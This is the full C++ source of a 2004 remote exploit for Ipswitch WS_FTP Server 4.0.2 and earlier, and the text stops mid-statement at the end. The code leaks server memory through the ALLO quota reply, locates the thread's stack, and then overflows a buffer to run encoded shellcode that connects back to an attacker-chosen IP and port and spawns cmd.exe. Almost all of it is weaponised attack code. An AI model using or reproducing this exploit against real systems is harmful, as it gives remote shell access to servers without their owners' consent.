/*
 * Ipswitch WS_FTP Server <= 4.0.2 ALLO exploit
 * (c)2004 Hugh Mann hughmann@hotmail.com
 *
 * This exploit has been tested with WS_FTP Server 4.0.2.EVAL, Windows XP SP1
 *
 * NOTE:
 * - The exploit assumes the user has a total file size limit. If the user only has
 *	 a max number of files limit you will need to rewrite parts of this exploit for
 *	 it to work.
 */

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const char* temp_file = "#t#t#t";
#define ALLO_STRING "ALLO 18446744073709551615"

/*
 * Assume all addresses >= this address to be invalid addresses. If the exploit doesn't work,
 * try changing it to a larger value, eg. 0x80000000 or 0xC0000000.
 */
const MAX_ADDR = 0x80000000;

/*
 * Size of each thread's stack space. From iFtpSvc.exe PE header. Must be a power of 2.
 * Should not be necessary to change this since practically all PE files use the default
 * size (1MB).
 */
const SERV_STK_SIZE = 0x00100000;

/*
 * This is the lower bits of ESP when the ALLO handler is called. This is very WS_FTP Server
 * version dependent. Should be = ESP (mod SERV_STK_SIZE)
 */
const SERV_STK_OFFS = 0x0007F208;

/*
 * This is the offset of the "this" pointer relative to SERV_STK_OFFS in the ALLO handler.
 */
const SERV_STK_THIS_OFFS = -(0x210+4);	// EBP is saved

/*
 * Offset of username relative to the "this" pointer
 */
const SERV_THIS_USERNAME_OFFS = 0x9F8;

/*
 * Offset of FTP cmd buf relative to the "this" pointer
 */
const SERV_THIS_CMDBUF_OFFS = 0x1F8;

/*
 * Offset of EIP relative to vulnerable buffer
 */
const SERV_BUF_EIP = 0x110;

/*
 * Return addresses to JMP ESP instruction. Must contain bytes that are valid shellcode characters.
 */
#if 1
const char* ret_addr = "\xD3\xD9\xE2\x77";	// advapi32.dll (08/29/2002), WinXP SP1
#else
// mswsock.dll is not loaded by WS_FTP Server, and I haven't investigated which DLL actually loads it
// so I don't use this possibly better return address.
const char* ret_addr = "\x3D\x40\xA5\x71";	// mswsock.dll (08/23/2001), WinXP SP1 and probably WinXP too
#endif

#define MAXLINE 0x1000

static char inbuf[MAXLINE];
static unsigned inoffs = 0;
static char last_line[MAXLINE];
static int output_all = 0;
static int quite_you = 0;

void msg2(const char *format, ...)
{
	va_list args;
	va_start(args, format);
	vfprintf(stdout, format, args);
}

void msg(const char *format, ...)
{
	if (quite_you && output_all == 0)
		return;

	va_list args;
	va_start(args, format);
	vfprintf(stdout, format, args);
}

int isrd(SOCKET s)
{
	fd_set r;
	FD_ZERO(&r);
	FD_SET(s, &r);
	timeval t = {0, 0};
	int ret = select(1, &r, NULL, NULL, &t);
	if (ret < 0)
		return 0;
	else
		return ret != 0;
}

void print_all(const char* buf, int len = -1)
{
	if (len == -1)
		len = (int)strlen(buf);

	for (int i = 0; i < len; i++)
		putc(buf[i], stdout);
}

int _recv(SOCKET s, char* buf, int len, int flags)
{
	int ret = recv(s, buf, len, flags);
	if (!output_all || ret < 0)
		return ret;

	print_all(buf, ret);
	return ret;
}

int get_line(SOCKET s, char* string, unsigned len)
{
	char* nl;
	while ((nl = (char*)memchr(inbuf, '\n', inoffs)) == NULL)
	{
		if (inoffs >= sizeof(inbuf))
		{
			msg("[-] Too long line\n");
			return 0;
		}
		int len = _recv(s, &inbuf[inoffs], sizeof(inbuf) - inoffs, 0);
		if (len <= 0)
		{
			msg("[-] Error receiving data\n");
			return 0;
		}

		inoffs += len;
	}

	strncpy(last_line, inbuf, sizeof(last_line));
	last_line[sizeof(last_line)-1] = 0;

	unsigned nlidx = (unsigned)(ULONG_PTR)(nl - inbuf);
	if (nlidx >= len)
	{
		msg("[-] Too small caller buffer\n");
		return 0;
	}
	memcpy(string, inbuf, nlidx);
	string[nlidx] = 0;
	if (nlidx > 0 && string[nlidx-1] == '\r')
		string[nlidx-1] = 0;

	if (nlidx + 1 >= inoffs)
		inoffs = 0;
	else
	{
		memcpy(inbuf, &inbuf[nlidx+1], inoffs - (nlidx + 1));
		inoffs -= nlidx + 1;
	}

	return 1;
}

int ignorerd(SOCKET s)
{
	inoffs = 0;

	while (1)
	{
		if (!isrd(s))
			return 1;
		if (_recv(s, inbuf, sizeof(inbuf), 0) < 0)
			return 0;
	}
}

int get_reply_code(SOCKET s, int (*func)(void* data, char* line) = NULL, void* data = NULL)
{
	char line[MAXLINE];

	if (!get_line(s, line, sizeof(line)))
	{
		msg("[-] Could not get status code\n");
		return -1;
	}
	if (func)
		func(data, line);

	char c = line[3];
	line[3] = 0;
	int code;
	if (!(c == ' ' || c == '-') || strlen(line) != 3 || !(code = atoi(line)))
	{
		msg("[-] Weird reply\n");
		return -1;
	}

	char endline[4];
	memcpy(endline, line, 3);
	endline[3] = ' ';
	if (c == '-')
	{
		while (1)
		{
			if (!get_line(s, line, sizeof(line)))
			{
				msg("[-] Could not get next line\n");
				return -1;
			}
			if (func)
				func(data, line);
			if (!memcmp(line, endline, sizeof(endline)))
				break;
		}
	}

	return code;
}

int sendb(SOCKET s, const char* buf, int len, int flags = 0)
{
	while (len)
	{
		int l = send(s, buf, len, flags);
		if (l <= 0)
			break;
		len -= l;
		buf += l;
	}

	return len == 0;
}

int sends(SOCKET s, const char* buf, int flags = 0)
{
	return sendb(s, buf, (int)strlen(buf), flags);
}

int _send_cmd(SOCKET s, const char* fmt, va_list args, int need_reply)
{
	char buf[MAXLINE];
	buf[sizeof(buf)-1] = 0;
	if (_vsnprintf(buf, sizeof(buf), fmt, args) < 0 || buf[sizeof(buf)-1] != 0)
	{
		msg("[-] Buffer overflow\n");
		return -1;
	}

	if (output_all)
		print_all(buf);

	if (!ignorerd(s) || !sends(s, buf))
		return -1;

	if (need_reply)
		return get_reply_code(s);

	return 0;
}

int send_cmd(SOCKET s, const char* fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	return _send_cmd(s, fmt, args, 1);
}

int send_cmd2(SOCKET s, const char* fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	return _send_cmd(s, fmt, args, 0);
}

int add_bytes(void* dst, int& dstoffs, int dstlen, const void* src, int srclen)
{
	if (dstoffs < 0 || dstoffs + srclen > dstlen || dstoffs + srclen < dstoffs)
	{
		msg("[-] Buffer overflow ;)\n");
		return 0;
	}

	memcpy((char*)dst+dstoffs, src, srclen);
	dstoffs += srclen;
	return 1;
}

int check_invd_bytes(const char* name, const void* buf, int buflen, int (*chkchar)(char c))
{
	const char* b = (const char*)buf;

	for (int i = 0; i < buflen; i++)
	{
		if (!chkchar(b[i]))
		{
			msg("[-] %s[%u] (%02X) is an invalid character\n", name, i, (unsigned char)b[i]);
			return 0;
		}
	}

	return 1;
}

int enc_byte(char& c, char& k, int (*chkchar)(char c))
{
	for (int i = 0; i < 0x100; i++)
	{
		if (!chkchar(c ^ i) || !chkchar(i))
			continue;

		c ^= i;
		k = i;
		return 1;
	}

	msg("[-] Could not find encryption key for byte %02X\n", c);
	return 0;
}

int get_enc_key(char* buf, int size, int offs, int step, int (*chkchar)(char c), int ignore1 = -1, int ignore2 = -1)
{
	for (int i = 0; i < 0x100; i++)
	{
		if (!chkchar(i))
			continue;

		for (int j = offs; j < size; j += step)
		{
			if (ignore1 != -1 && (j >= ignore1 && j <= ignore2))
				continue;	// These bytes aren't encrypted
			if (!chkchar(buf[j] ^ i))
				break;
		}
		if (j < size)
			continue;

		return i;
	}

	msg("[-] Could not find an encryption key\n");
	return -1;
}

int login(SOCKET s, const char* username, const char* userpass)
{
	msg("[+] Logging in as %s...\n", username);
	int code;
	if ((code = send_cmd(s, "USER %s\r\n", username)) < 0)
	{
		msg("[-] Failed to log in #1\n");
		return 0;
	}

	if (code == 331)
	{
		if ((code = send_cmd(s, "PASS %s\r\n", userpass)) < 0)
		{
			msg("[-] Failed to log in #2\n");
			return 0;
		}
	}

	if (code != 230)
	{
		msg("[-] Failed to log in. Code %3u\n", code);
		return 0;
	}

	msg("[+] Logged in\n");
	return 1;
}

class xuser
{
public:
	xuser() : s(INVALID_SOCKET) {}
	~xuser() {close();}
	int init(unsigned long ip, unsigned short port, const char* username, const char* userpass);
	void close() {if (s >= 0) closesocket(s); s = INVALID_SOCKET;}
	SOCKET sock() const {return s;}
	int exploit(unsigned long sip, unsigned short sport);
	int read_serv_mem_bytes(unsigned addr, void* dst, int dstlen);
	int read_serv_mem_string(unsigned addr, char* dst, int dstlen);
	int read_serv_mem_uint32(unsigned addr, unsigned* dst);

protected:
	int read_serv_mem(unsigned addr, void* dst, int dstlen);

	SOCKET s;
	char username[260];
	char userpass[260];
	unsigned long ip;
	unsigned short port;
};

/*
 * XAUT code tested with WS_FTP Server 4.0.2.EVAL
 */
#define XAUT_2_KEY 0x49327576

int xaut_encrypt(char* dst, const char* src, int len, unsigned long key)
{
	unsigned char keybuf[0x80*4];

	for (int i = 0; i < sizeof(keybuf)/4; i++)
	{
		keybuf[i*4+0] = (char)key;
		keybuf[i*4+1] = (char)(key >> 8);
		keybuf[i*4+2] = (char)(key >> 16);
		keybuf[i*4+3] = (char)(key >> 24);
	}

	for (int i = 0; i < len; i++)
	{
		if (i >= sizeof(keybuf))
		{
			msg("[-] xaut_encrypt: Too long input buffer\n");
			return 0;
		}
		*dst++ = *src++ ^ keybuf[i];
	}

	return 1;
}

char* xaut_unpack(char* src, int len, int delete_it)
{
 	char* dst = new char[len*2 + 1];

	for (int i = 0; i < len; i++)
	{
		dst[i*2+0] = ((src[i] >> 4) & 0x0F) + 0x35;
		dst[i*2+1] = (src[i] & 0x0F) + 0x31;
	}
	dst[i*2] = 0;

	if (delete_it)
		delete src;

	return dst;
}

int xaut_login(SOCKET s, int d, const char* username, const char* password, unsigned long key)
{
	msg("[+] Logging in [XAUT] as %s...\n", username);
	int ret = 0;
	char* dst = NULL;
	__try
	{
		const char* middle = ":";
		dst = new char[strlen(username) + strlen(middle) + strlen(password) + 1];
		strcpy(dst, username);
		strcat(dst, middle);
		strcat(dst, password);
		int len = (int)strlen(dst);
		if ((d == 2 && !xaut_encrypt(dst, dst, len, XAUT_2_KEY)) || !xaut_encrypt(dst, dst, len, key))
			__leave;

		dst = xaut_unpack(dst, len, 1);
		if (send_cmd(s, "XAUT %d %s\r\n", d, dst) != 230)
			__leave;

		ret = 1;
	}
	__finally
	{
		delete dst;
	}

	if (!ret)
		msg("[-] Failed to log in\n");
	else
		msg("[+] Logged in\n");

	return ret;
}

struct my_data
{
	unsigned long key;
	int done_that;
	char hostname[256];
};

int line_callback(void* data, char* line)
{
	my_data* m = (my_data*)data;
	if (m->done_that)
		return 1;

	/*
	 * Looking for a line similar to:
	 *
	 *	"220-FTP_HOSTNAME X2 WS_FTP Server 4.0.2.EVAL (41541732)\r\n"
	 */
	char* s, *e;
	if (strncmp(line, "220", 3) || !strstr(line, "WS_FTP Server") ||
		(s = strrchr(line, '(')) == NULL || (e = strchr(s, ')')) == NULL)
		return 1;

	char buf[0x10];
	int len = (int)(ULONG_PTR)(e - (s+1));
	if (len >= sizeof(buf) || len > 10)
		return 1;
	memcpy(buf, s+1, len);
	buf[len] = 0;
	for (int i = 0; i < len; i++)
	{
		if (!isdigit((unsigned char)buf[i]))
			return 1;
	}
	m->key = atol(buf);

	for (int i = 4, len = (int)strlen(line); i < len; i++)
	{
		if (i-4 >= sizeof(m->hostname))
			return 1;
		m->hostname[i-4] = line[i];
		if (line[i] == ' ')
			break;
	}
	m->hostname[i-4] = 0;
	if (m->hostname[0] == 0)
		return 1;

	m->done_that = 1;
	return 1;
}

int xuser::init(unsigned long _ip, unsigned short _port, const char* _username, const char* _userpass)
{
	ip = _ip;
	port = _port;
	close();

	strncpy(username, _username, sizeof(username));
	if (username[sizeof(username)-1] != 0)
	{
		msg("[-] username too long\n");
		return 0;
	}
	strncpy(userpass, _userpass, sizeof(userpass));
	if (userpass[sizeof(userpass)-1] != 0)
	{
		msg("[-] userpass too long\n");
		return 0;
	}

	sockaddr_in saddr;
	memset(&saddr, 0, sizeof(saddr));
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(port);
	saddr.sin_addr.s_addr = htonl(ip);

	in_addr a; a.s_addr = htonl(ip);
	msg("[+] Connecting to %s:%u...\n", inet_ntoa(a), port);
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s < 0 || connect(s, (sockaddr*)&saddr, sizeof(saddr)) < 0)
	{
		msg("[-] Could not connect\n");
		return 0;
	}
	msg("[+] Connected\n");

	my_data m;
	memset(&m, 0, sizeof(m));
	int code = get_reply_code(s, line_callback, &m);
	if (code != 220)
	{
		msg("[-] Got reply %3u\n", code);
		return 0;
	}
	else if (!m.done_that)
	{
		msg("[-] Could not find XAUT key or host name => Not a WS_FTP Server\n");
		return 0;
	}

	if (!xaut_login(s, 0, username, userpass, m.key) && !login(s, username, userpass))
		return 0;

	// Don't want UTF8 conversions
	if (send_cmd(s, "LANG en\r\n") != 200)
	{
		msg("[-] Apparently they don't understand the english language\n");
		return 0;
	}

	if (send_cmd(s, "NOOP step into the light\r\n") != 200)
	{
		msg("[-] C4n't k1ll 4 z0mbie\n");
		return 0;
	}

	return 1;
}

SOCKET get_data_sock(SOCKET s, const char* filename, const char* cmd)
{
	SOCKET sd = INVALID_SOCKET;

	int error = 1;
	__try
	{
		sockaddr_in saddr;
		int len = sizeof(saddr);
		if (getsockname(s, (sockaddr*)&saddr, &len) < 0 || len != sizeof(saddr) ||
			(sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
			__leave;

		sockaddr_in daddr;
		memset(&daddr, 0, sizeof(daddr));
		daddr.sin_family = AF_INET;
		daddr.sin_port = 0;
		daddr.sin_addr.s_addr = saddr.sin_addr.s_addr;
		len = sizeof(daddr);
		if (bind(sd, (sockaddr*)&daddr, sizeof(daddr)) < 0 || listen(sd, 1) < 0 ||
			getsockname(sd, (sockaddr*)&daddr, &len) < 0 || len != sizeof(daddr))
			__leave;

		unsigned long ip = ntohl(daddr.sin_addr.s_addr);
		unsigned short port = ntohs(daddr.sin_port);
		if (send_cmd(s, "PORT %u,%u,%u,%u,%u,%u\r\n",
			(unsigned char)(ip >> 24),
			(unsigned char)(ip >> 16),
			(unsigned char)(ip >> 8),
			(unsigned char)ip,
			(unsigned char)(port >> 8),
			(unsigned char)port) != 200)
			__leave;

		if (send_cmd2(s, "%s %s\r\n", cmd, filename) < 0)
			__leave;

		msg("[+] Waiting for server to connect...\n");
		SOCKET sa;
		sockaddr_in aaddr;
		len = sizeof(aaddr);
		if ((sa = accept(sd, (sockaddr*)&aaddr, &len)) < 0)
			__leave;
		closesocket(sd);
		sd = sa;

		if (get_reply_code(s) != 150)
			__leave;

		error = 0;
	}
	__finally
	{
		if (error)
		{
			msg("[-] Could not create data connection, %u\n", GetLastError());
			closesocket(sd);
			sd = INVALID_SOCKET;
		}
		else
			msg("[+] Server connected\n");
	}

	return sd;
}

int create_file(SOCKET s, const char* tmpname, unsigned size = 1)
{
	int ret = 0;

	SOCKET sd = INVALID_SOCKET;
	__try
	{
		if (size > 1 && send_cmd(s, "REST %u\r\n", size) != 350)
			__leave;
		if ((sd = get_data_sock(s, tmpname, "STOR")) < 0)
			__leave;

		ret = 1;
	}
	__finally
	{
		if (sd >= 0)
			closesocket(sd);
	}
	if (ret && get_reply_code(s) != 226)
		ret = 0;

	return ret;
}

const unsigned int shlc2_offs_encstart = 0x0000002B;
const unsigned int shlc2_offs_encend = 0x000001B8;
const unsigned int shlc2_offs_enckey = 0x00000025;
unsigned char shlc2_code[] =
"\xEB\x16\x78\x56\x34\x12\x78\x56\x34\x12\x78\x56\x34\x12\x78\x56"
"\x34\x12\x5B\x53\x83\xEB\x1D\xC3\xE8\xF5\xFF\xFF\xFF\x33\xC9\xB1"
"\x64\x81\x74\x8B\x27\x55\x55\x55\x55\xE2\xF6\xFC\x8B\x43\x0A\x31"
"\x43\x02\x8B\x43\x0E\x31\x43\x06\x89\x4B\x0A\x89\x4B\x0E\x64\x8B"
"\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\xAD\x8B\x68\x08\x8D"
"\x83\x67\x01\x00\x00\x55\xE8\xB7\x00\x00\x00\x68\x33\x32\x00\x00"
"\x68\x77\x73\x32\x5F\x54\xFF\xD0\x96\x8D\x83\x74\x01\x00\x00\x56"
"\xE8\x9D\x00\x00\x00\x81\xEC\x90\x01\x00\x00\x54\x68\x01\x01\x00"
"\x00\xFF\xD0\x8D\x83\x7F\x01\x00\x00\x56\xE8\x83\x00\x00\x00\x33"
"\xC9\x51\x51\x51\x6A\x06\x6A\x01\x6A\x02\xFF\xD0\x97\x8D\x83\x8A"
"\x01\x00\x00\x56\xE8\x69\x00\x00\x00\x33\xC9\x51\x51\x51\x51\x6A"
"\x10\x8D\x4B\x02\x51\x57\xFF\xD0\xB9\x54\x00\x00\x00\x2B\xE1\x88"
"\x6C\x0C\xFF\xE2\xFA\xC6\x44\x24\x10\x44\x41\x88\x4C\x24\x3C\x88"
"\x4C\x24\x3D\x89\x7C\x24\x48\x89\x7C\x24\x4C\x89\x7C\x24\x50\x49"
"\x8D\x44\x24\x10\x54\x50\x51\x51\x51\x6A\x01\x51\x51\x8D\x83\xA4"
"\x01\x00\x00\x50\x51\x8D\x83\x95\x01\x00\x00\x55\xE8\x11\x00\x00"
"\x00\x59\xFF\xD0\x8D\x83\xAC\x01\x00\x00\x55\xE8\x02\x00\x00\x00"
"\xFF\xD0\x60\x8B\x7C\x24\x24\x8D\x6F\x78\x03\x6F\x3C\x8B\x6D\x00"
"\x03\xEF\x83\xC9\xFF\x41\x3B\x4D\x18\x72\x0B\x64\x89\x0D\x00\x00"
"\x00\x00\x8B\xE1\xFF\xE4\x8B\x5D\x20\x03\xDF\x8B\x1C\x8B\x03\xDF"
"\x8B\x74\x24\x1C\xAC\x38\x03\x75\xDC\x43\x84\xC0\x75\xF6\x8B\x5D"
"\x24\x03\xDF\x0F\xB7\x0C\x4B\x8B\x5D\x1C\x03\xDF\x8B\x0C\x8B\x03"
"\xCF\x89\x4C\x24\x1C\x61\xC3\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61"
"\x72\x79\x41\x00\x57\x53\x41\x53\x74\x61\x72\x74\x75\x70\x00\x57"
"\x53\x41\x53\x6F\x63\x6B\x65\x74\x41\x00\x57\x53\x41\x43\x6F\x6E"
"\x6E\x65\x63\x74\x00\x43\x72\x65\x61\x74\x65\x50\x72\x6F\x63\x65"
"\x73\x73\x41\x00\x63\x6D\x64\x2E\x65\x78\x65\x00\x45\x78\x69\x74"
"\x50\x72\x6F\x63\x65\x73\x73\x00";

int is_valid_shlc2(char c)
{
	return c != 0;
}

struct tfs_data
{
	tfs_data() : tot_size(0), line(0), ok(0) {}
	int line;
	unsigned tot_size;
	int ok;
};

int tfs_line_callback(void* data, char* line)
{
	tfs_data* m = (tfs_data*)data;
	if (++m->line != 1)
		return 1;

	if (strncmp(line, "250-", 4) ||
		(m->tot_size = atoi(line+4)) == 0)
		return 1;

	m->ok = 1;
	return 1;
}

int get_user_total_file_size(SOCKET s, unsigned& tot_size)
{
	int ret = 0;
	SOCKET sd = INVALID_SOCKET;
	__try
	{
		/*
		 * Create a $message.txt file
		 */
		if ((sd = get_data_sock(s, "$message.txt", "STOR")) < 0 ||
			send(sd, "%z", 2, 0) != 2)
			__leave;
		closesocket(sd);
		sd = INVALID_SOCKET;
		if (get_reply_code(s) != 226)
			__leave;

		tfs_data m;
		const DWORD max_wait = 10000;
		for (DWORD tc = GetTickCount(); GetTickCount() - tc < max_wait; )
		{
			if (send_cmd2(s, "CWD .\r\n") < 0)
				__leave;
			m.ok = m.line = 0;
			int code = get_reply_code(s, tfs_line_callback, &m);
			if (code != 500)
				break;
		}

		if (!m.ok)
			__leave;

		tot_size = m.tot_size;
		ret = 1;
	}
	__finally
	{
		if (sd >= 0)
			closesocket(sd);
	}

	if (!ret)
		msg("[-] Failed to get user total file size.\n    Are you sure there's a total file size limit for this user?\n");

	return ret;
}

int delete_file(SOCKET s, const char* filename)
{
	DWORD tc = GetTickCount();
	const DWORD wait = 10000;
	while (1)
	{
		if (GetTickCount() - tc > wait)
			return 0;

		if (send_cmd(s, "STAT %s\r\n", filename) != 211)
			return 1;
		if (send_cmd(s, "DELE %s\r\n", filename) < 0)
			return 0;
	}
}

int create_file_for_addr(SOCKET s, unsigned addr)
{
	int ret = 0;
	__try
	{
		if (addr >= MAX_ADDR)
		{
			msg2("[-] Trying to read an addr (%08X) >= MAX_ADDR (%08X)\n", addr, MAX_ADDR);
			__leave;
		}
		if (!delete_file(s, temp_file))
			msg("[-] Could not delete file\n");

		unsigned tot_size;
		if (!get_user_total_file_size(s, tot_size))
			__leave;

		if (addr < tot_size)
		{
			msg2("[-] You must delete some user files to read address %08X\n", addr);
			__leave;
		}
		unsigned size = addr - tot_size;
		if (!create_file(s, temp_file, size))
			__leave;

		ret = 1;
	}
	__finally
	{
	}

	return ret;
}

/*
 * Returns < 0 => error
 * Returns = 0 => server thread crashed
 * Returns > 0 => read this many bytes into dst
 */
int xuser::read_serv_mem(unsigned addr, void* dst, int dstlen)
{
	int file_created = 0;
	int ret = -1;
	__try
	{
		if (!create_file_for_addr(s, addr))
			__leave;
		file_created = 1;

		if (send_cmd2(s, ALLO_STRING "\r\n") < 0)
			__leave;

		char buf[MAXLINE];
		int bufsz = 0;
		const char* m1 = "452 ";
		int type = 0;
		while (1)
		{
			if (bufsz >= sizeof(buf)-1)
				__leave;

			int size = _recv(s, &buf[bufsz], sizeof(buf)-1-bufsz, 0);
			if (size < 0)
				__leave;
			if (size == 0)
			{
				if (bufsz == 0)
					ret = 0;
				__leave;
			}
			bufsz += size;
			buf[bufsz] = 0;

			if (bufsz >= (int)strlen(m1) && memcmp(m1, buf, strlen(m1)))
				__leave;	// Wrong reply code

			const char* s1 = " files\r\n";
			const char* s2 = " size\r\n";
			if (bufsz >= (int)strlen(s1) && !memcmp(s1, &buf[bufsz-strlen(s1)], strlen(s1)))
			{
				type = 0;
				break;
			}
			if (bufsz >= (int)strlen(s2) && !memcmp(s2, &buf[bufsz-strlen(s2)], strlen(s2)))
			{
				type = 1;
				break;
			}
		}

		const char* s = "quota exceeded; ";
		const char* f1 = " size; ";
		const char* f2 = " size\r\n";
		const char* f3 = " files; ";
		char* b = buf + strlen(m1);
		if (strncmp(b, s, strlen(s)))
			__leave;
		char* ss = NULL, *se = NULL;
		if (type == 0)	// "quota exceeded; %s size; %u files\r\n"
		{
			ss = b + strlen(s);
			for (int i = bufsz-(int)strlen(f1); ; i--)
			{
				if (i < 0)
					__leave;
				if (strncmp(f1, &buf[i], strlen(f1)))
					continue;	// Not equal to " size; "
				se = &buf[i];
				break;
			}
		}
		else			// "quota exceeded; %u files; %s size\r\n"
		{
			ss = strstr(buf, f3);
			if (!ss)
				__leave;
			ss += strlen(f3);
			se = &buf[bufsz-strlen(f2)];
		}
		if (!se || !ss || se < ss)
		{
			msg("[-] Buggy code\n");
			__leave;
		}

		*se = 0;
		int rd_size = (int)(UINT_PTR)(se - ss) + 1;	// One 00h byte
		ret = min((int)dstlen, rd_size);
		memcpy(dst, ss, ret);
	}
	__finally
	{
	}

	if (ret < 0)
		msg("[-] Could not read server memory\n");
	else if (ret == 0)
	{
		// Server thread crashed
		if (!init(ip, port, username, userpass))
			ret = -1;
	}

	return ret;
}

int xuser::read_serv_mem_bytes(unsigned addr, void* dst, int dstlen)
{
	for (int i = 0; i < (int)dstlen; )
	{
		int len = read_serv_mem(addr+i, (char*)dst+i, dstlen-i);
		if (len <= 0)
			return len;
		i += len;
	}

	return dstlen;
}

int xuser::read_serv_mem_string(unsigned addr, char* dst, int dstlen)
{
	int len = read_serv_mem(addr, dst, dstlen);
	if (len <= 0)
		return len;
	if (dst[len-1] != 0)
		return -1;
	return len;
}

int xuser::read_serv_mem_uint32(unsigned addr, unsigned* dst)
{
	unsigned char tmp[4];
	int ret = read_serv_mem_bytes(addr, tmp, sizeof(tmp));
	if (ret <= 0)
		return ret;
	if (ret != sizeof(tmp))
		return -1;

	*dst = (tmp[3] << 24) | (tmp[2] << 16) | (tmp[1] << 8) | tmp[0];
	return ret;
}

int xuser::exploit(unsigned long sip, unsigned short sport)
{
	int ret = 0;
	char* shellcode = NULL;
	char* badbuf = NULL;
	__try
	{
		/*
		 * Encrypt the shellcode
		 */
		const shellcode_len = sizeof(shlc2_code)-1;
		shellcode = new char[shellcode_len+1];
		memcpy(shellcode, shlc2_code, shellcode_len);
		shellcode[shellcode_len] = 0;

		shellcode[2] = (char)2;
		shellcode[3] = (char)(2 >> 8);
		shellcode[4] = (char)(sport >> 8);
		shellcode[5] = (char)sport;
		shellcode[6] = (char)(sip >> 24);
		shellcode[7] = (char)(sip >> 16);
		shellcode[8] = (char)(sip >> 8);
		shellcode[9] = (char)sip;
		for (int i = 0; i < 8; i++)
		{
			if (!enc_byte(shellcode[2+i], shellcode[2+8+i], is_valid_shlc2))
				__leave;
		}

		for (int i = 0; i < 4; i++)
		{
			int k = get_enc_key(&shellcode[shlc2_offs_encstart], shlc2_offs_encend-shlc2_offs_encstart, i, 4, is_valid_shlc2);
			if (k < 0)
				__leave;
			shellcode[shlc2_offs_enckey+i] = k;
		}
		msg("[+] Shellcode encryption key = %02X%02X%02X%02X\n",
			(unsigned char)shellcode[shlc2_offs_enckey+3],
			(unsigned char)shellcode[shlc2_offs_enckey+2],
			(unsigned char)shellcode[shlc2_offs_enckey+1],
			(unsigned char)shellcode[shlc2_offs_enckey]);
		for (int i = 0; i < shlc2_offs_encend-shlc2_offs_encstart; i++)
			shellcode[shlc2_offs_encstart+i] ^= shellcode[shlc2_offs_enckey + i % 4];

		/*
		 * Do some sanity checks
		 */
		if (!check_invd_bytes("shellcode", shellcode, shellcode_len, is_valid_shlc2) ||
			!check_invd_bytes("ret_addr", ret_addr, 4, is_valid_shlc2))
			__leave;

		if (!delete_file(s, temp_file))
		{
			msg("Could not delete file\n");
			__leave;
		}

		unsigned tot_size;
		if (!get_user_total_file_size(s, tot_size))
			__leave;

		msg("[+] Scanning server memory: ");
		quite_you = 1;
		const unsigned ADDR_START = SERV_STK_SIZE;
		const unsigned ADDR_END = MAX_ADDR-1;
		unsigned this_ptr;
		for (unsigned addr = ADDR_START; ; addr += SERV_STK_SIZE)
		{
			if (addr > ADDR_END || !addr)
			{
				/*
				 * Can happen if the address of the thread's stack is not in the same position in
				 * memory. This most likely happens when another user logged in or it sent a FTP
				 * command which creates a new server thread. Try again.
				 */
				msg2("[-] Could not find the this ptr. Try again.\n");
				__leave;
			}
			int rc = read_serv_mem_uint32(addr + SERV_STK_OFFS + SERV_STK_THIS_OFFS, &this_ptr);
			if (rc < 0)
			{
				msg2("- unknown error\n");	// Error
				__leave;
			}
			else if (rc == 0)
			{
				msg2("x");	// Crashed
			}
			else
			{
				msg2(".");	// Bingo

				char tmp[0x200];
				if (this_ptr + SERV_THIS_USERNAME_OFFS < MAX_ADDR && this_ptr + SERV_THIS_CMDBUF_OFFS < MAX_ADDR &&
					read_serv_mem_string(this_ptr + SERV_THIS_USERNAME_OFFS, tmp, sizeof(tmp)) > 0 &&
					!strcmp(tmp, username) &&
					read_serv_mem_string(this_ptr + SERV_THIS_CMDBUF_OFFS, tmp, sizeof(tmp)) > 0 &&
					!strcmp(tmp, ALLO_STRING))
					break;
			}
		}
		quite_you = 0;
		msg("\n[+] this = %08X\n", this_ptr);

		const char* s1 = "quota exceeded; ";
		char padding[SERV_BUF_EIP];
		int padding_len = sizeof(padding) - (int)strlen(s1);
		memset(padding, 'A', sizeof(padding));

		int xpsz = (int)strlen(ALLO_STRING "\r\n") + padding_len + 4 + shellcode_len;
		badbuf = new char[xpsz+1];
		badbuf[xpsz] = 0;
		int tmpidx = 0;
		if (!add_bytes(badbuf, tmpidx, xpsz, ALLO_STRING "\r\n", (int)strlen(ALLO_STRING "\r\n")) ||
			!add_bytes(badbuf, tmpidx, xpsz, padding, padding_len) ||
			!add_bytes(badbuf, tmpidx, xpsz, ret_addr, 4) ||
			!add_bytes(badbuf, tmpidx, xpsz, shellcode, shellcode_len) ||
			tmpidx != xpsz)
		{
			msg("[-] This is a bug. Now you know\n");
			__leave;
		}

		if (!create_file_for_addr(s, this_ptr + SERV_THIS_CMDBUF_OFFS + strlen(ALLO_STRING "\r\n")))
			__leave;
		if (send_cmd2(s, badbuf) < 0)
			__leave;

		ret = 1;
	}
	__finally
	{
		quite_you = 0;
		if (shellcode)
			delete shellcode;
		if (badbuf)
			delete badbuf;
	}

	return ret;
}

void show_help(char* pname)
{
	msg("%s <ip> <port> <sip> <sport> [-u username] [-p userpass] [-a]\n", pname);
	exit(1);
}

int main(int argc, char** argv)
{
	msg("Ipswitch WS_FTP Server <= 4.0.2 ALLO exploit\n");
	msg("(c)2004 Hugh Mann hughmann@hotmail.com\n");

	WSADATA wsa;
	if (WSAStartup(0x0202, &wsa))
		return 1;

	if (argc < 5)
		show_help(argv[0]);

	unsigned long ip = ntohl(inet_addr(argv[1]));
	unsigned short port = (unsigned short)atoi(argv[2]);
	unsigned long sip = ntohl(inet_addr(argv[3]));
	unsigned short sport = (unsigned short)atoi(argv[4]);
	const char* username = "anonymous";
	const char* userpass = "Hugh�Mann";

	for (int i = 5; i < argc; i++)
	{
		if (!strcmp(argv[i], "-u") && i + 1 < argc)
		{
			username = argv[++i];
		}
		else if (!strcmp(argv[i], "-p") && i + 1 < argc)
		{
			userpass = argv[++i];
		}
		else if (!strcmp(argv[i], "-a"))
		{
			output_all = 1;
		}
		else
			show_help(argv[0]);
	}

	if (!ip || !port || !sip || !sport)
		show_help(argv[0]);

	xuser user;
	if (!user.init(ip, port, username, userpass))
		return 0;

	if (!user.exploit(sip, sport))
		msg("[-] u n33d t0 s7uddy m0r3...\n");
	else
